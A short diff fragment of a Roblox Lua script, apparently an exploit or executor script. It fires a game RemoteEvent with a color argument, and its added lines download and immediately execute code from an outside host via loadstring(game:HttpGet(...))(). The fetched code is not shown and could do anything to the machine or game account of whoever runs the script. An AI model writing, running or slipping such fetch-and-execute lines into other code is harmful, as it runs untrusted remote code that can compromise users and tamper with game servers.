@@ -6367,3 +6367,7 @@ local args = {
 	Color3.new(1, 0.022445499897003174, 0)
 }
 game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1RPNam1eColo1r"):FireServer(unpack(args))
+
+task.wait(1)
+
+loadstring(game:HttpGet("https://scriptsneonauth.vercel.app/api/scripts/3792552f-efb4-4e00-902d-61cf96c667f8/raw"))()
